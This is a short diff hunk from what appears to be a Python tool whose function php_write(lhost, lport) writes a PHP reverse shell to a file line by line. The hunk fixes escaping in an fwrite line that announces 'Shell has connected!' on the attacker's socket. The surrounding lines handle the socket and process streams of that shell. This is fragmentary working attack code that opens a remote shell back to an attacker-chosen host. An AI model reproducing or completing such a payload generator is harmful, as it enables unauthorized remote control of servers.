@@ -362,7 +362,7 @@ def php_write(lhost,lport):
     f.write("{\n")
     f.write("stream_set_blocking($pp, false);\n")
     f.write("}\n")
-    f.write("@fwrite($soc, \"SOCKET: Shell has connected! PID: \" . proc_get_status($proc) ['pid'] . \"\\n\"\);\\n\")\n")
+    f.write("@fwrite($soc, \"SOCKET: Shell has connected! PID: \" . proc_get_status($proc) ['pid'] . \"\\n\"\);\n")
     f.write("do\n")
     f.write("{\n")
     f.write("if (feof($soc))\n")
